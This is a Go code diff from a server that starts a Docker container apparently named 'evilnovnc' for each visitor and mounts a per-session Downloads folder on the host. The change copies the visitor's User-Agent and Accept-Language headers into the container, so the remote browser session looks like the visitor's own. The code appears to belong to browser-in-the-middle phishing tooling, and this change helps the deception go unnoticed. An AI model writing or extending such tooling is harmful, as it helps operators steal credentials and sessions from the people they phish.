@@ -109,9 +109,9 @@ func checkNumDocker() (int, error) {
 	return num, nil
 }
 
-func runDocker(uuid string, resolution string, folder string, webpage string) error {
+func runDocker(uuid string, resolution string, useragent string, language string, folder string, webpage string) error {
 	imageName := "evilnovnc"
-	envvars := []string{fmt.Sprintf("FOLDER=%s", uuid), fmt.Sprintf("RESOLUTION=%sx24", resolution), fmt.Sprintf("WEBPAGE=%s", webpage)}
+	envvars := []string{fmt.Sprintf("FOLDER=%s", uuid), fmt.Sprintf("RESOLUTION=%sx24", resolution), fmt.Sprintf("WEBPAGE=%s", webpage), fmt.Sprintf("USERAGENT=%s", useragent), fmt.Sprintf("LANG=%s", language)}
 	volumes := []string{fmt.Sprintf("%s/Downloads/%s/:/home/user/Downloads", folder, uuid)}
 
 	ctx := context.Background()
@@ -152,6 +152,12 @@ func resoHandler(w http.ResponseWriter, r *http.Request) {
 	resolution := r.URL.Query().Get("x")
 	resSplit := strings.Split(resolution, "x")
 
+	//Get user agent of the request in ua variable
+	useragent := r.Header.Get("User-Agent")
+
+	//Get the language of client in lang variable
+	lang := r.Header.Get("Accept-Language")
+
 	_, err1 := strconv.Atoi(resSplit[0])
 	_, err2 := strconv.Atoi(resSplit[1])
 	if err1 != nil || err2 != nil || len(resSplit) != 2 {
@@ -161,7 +167,7 @@ func resoHandler(w http.ResponseWriter, r *http.Request) {
 
 	folder := os.Args[1]
 	webpage := os.Args[2]
-	err := runDocker(id.String(), resolution, folder, webpage)
+	err := runDocker(id.String(), resolution, useragent, lang, folder, webpage)
 	if err != nil {
 		w.Write([]byte("error"))
 		return
@@ -181,6 +187,7 @@ func resoHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	w.Write([]byte(id.String()))
+
 }
 
 func main() {
